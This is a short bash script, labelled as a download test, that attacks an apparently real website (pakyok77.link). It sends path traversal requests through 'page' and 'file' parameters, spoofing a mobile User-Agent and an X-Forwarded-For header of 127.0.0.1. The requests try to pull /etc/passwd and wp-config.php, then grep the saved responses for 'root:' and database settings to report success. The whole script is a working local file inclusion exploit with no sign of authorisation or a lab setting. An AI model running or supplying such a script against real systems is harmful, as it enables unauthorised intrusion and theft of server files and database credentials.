#!/bin/bash
echo "Testing downloads..."
mkdir -p downloads
curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36" -H "X-Forwarded-For: 127.0.0.1" "https://pakyok77.link/index.php?page=../../../etc/passwd" > downloads/test1.txt
echo "Test 1 done, size: $(wc -c < downloads/test1.txt)"
if grep -q "root:" downloads/test1.txt; then echo "SUCCESS: passwd found"; else echo "FAILED: no passwd"; fi
curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36" -H "X-Forwarded-For: 127.0.0.1" "https://pakyok77.link/index.php?file=../../wp-config.php" > downloads/test2.txt
echo "Test 2 done, size: $(wc -c < downloads/test2.txt)"
if grep -q -i "db_name\|wp_" downloads/test2.txt; then echo "SUCCESS: wpconfig found"; else echo "FAILED: no wpconfig"; fi

